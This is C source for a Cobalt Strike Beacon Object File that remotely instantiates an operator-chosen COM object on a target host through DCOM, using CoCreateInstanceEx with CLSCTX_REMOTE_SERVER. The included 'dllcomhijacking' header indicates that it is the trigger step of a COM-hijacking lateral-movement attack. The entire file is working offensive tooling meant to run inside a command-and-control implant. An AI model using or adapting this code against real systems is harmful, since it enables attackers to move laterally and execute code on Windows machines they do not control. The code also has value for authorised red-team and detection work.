#include <stdio.h>
#include <Windows.h>
#include <objbase.h>
#include <oleauto.h>
#include <wbemidl.h>
#include "dllcomhijacking.h"
#include "beacon.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")


void InstantiateCOMObject(LPCOLESTR clsidString, WCHAR remoteHost[]) {
    IID iid;
    HRESULT hr = OLE32$CLSIDFromString(clsidString, &iid);
	if (FAILED(hr)) {
		if (hr == 0x800401f3) {
			BeaconPrintf(CALLBACK_ERROR, "The provided CLSID format \"%S\" is not correct (error code: 0x800401f3).\n", clsidString);
		} else {
			BeaconPrintf(CALLBACK_ERROR, "CLSIDFromString failed with error code: 0x%08lx\n", hr);
		}
		return;
	}

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitialize failed with error code: 0x%08lx\n", hr);
        return;
    }

    COAUTHINFO authInfo = {0};
    authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    authInfo.pwszServerPrincName = NULL;
    authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
    authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    authInfo.pAuthIdentityData = NULL;
    authInfo.dwCapabilities = EOAC_NONE;

    COSERVERINFO serverInfo = {0};
    serverInfo.pwszName = remoteHost;
    serverInfo.pAuthInfo = &authInfo;

	IID IIDIUnknown = {0x00000000, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    MULTI_QI mqi = {0};
    mqi.pIID = &IIDIUnknown; 

    hr = OLE32$CoCreateInstanceEx(&iid, NULL, CLSCTX_REMOTE_SERVER, &serverInfo, 1, &mqi);
    if (FAILED(hr)) {
		if (hr == 0x80040154) {
			BeaconPrintf(CALLBACK_ERROR, "Instantiating the COM object failed because it is not registered on the target system (error code: 0x80040154).\n", clsidString);
		} else {
			BeaconPrintf(CALLBACK_ERROR, "CoCreateInstanceEx failed with error code: 0x%08lx\n", hr);
		} 
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "==========================================\n[+] COM object instantiated successfully!\n");
    }

	if (mqi.pItf) mqi.pItf->lpVtbl->Release(mqi.pItf);
    OLE32$CoUninitialize();
}


int go(char *args, int len) {
	datap parser;
    LPCOLESTR* clsidString = L"";
    WCHAR* host = L""; 
	
	BeaconDataParse(&parser, args, len);
	clsidString = BeaconDataExtract(&parser, NULL);
	host = BeaconDataExtract(&parser, NULL);

    InstantiateCOMObject(clsidString, host);
    return 0;
}



